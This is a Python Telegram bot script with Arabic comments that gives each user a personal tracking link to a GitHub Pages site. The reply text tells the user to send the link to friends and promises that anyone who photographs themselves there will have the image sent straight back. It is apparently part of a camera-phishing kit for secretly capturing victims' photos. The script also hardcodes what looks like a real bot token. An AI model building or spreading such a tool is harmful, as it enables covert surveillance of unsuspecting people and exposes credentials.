import telebot

# التوكن الخاص بك (تم استخراجه من محادثتك السابقة)
TOKEN = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg'
bot = telebot.TeleBot(TOKEN)

# استبدل هذا الرابط برابط GitHub Pages الحقيقي الخاص بك
# مثال: https://khldwnnsraljrady-collab.github.io/telegram-bot-v1/
BASE_URL = "أدخل_رابط_موقعك_هنا" 

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    # هذا السطر هو الذي يربط الايدي بالرابط تلقائياً
    personal_link = f"{BASE_URL}?id={user_id}"
    
    response = (
        f"أهلاً بك يا {message.from_user.first_name}!\n\n"
        f"هذا هو رابطك الشخصي للالتقاط الصور:\n"
        f"`{personal_link}`\n\n"
        f"انسخ الرابط وأرسله لأصدقائك. أي شخص يصور نفسه، ستصلك صورته هنا فوراً! 😉"
    )
    # استخدام Markdown لجعل الرابط قابلاً للنسخ بلمسة واحدة
    bot.send_message(user_id, response, parse_mode="Markdown")

print("جاري تشغيل البوت...")
bot.polling()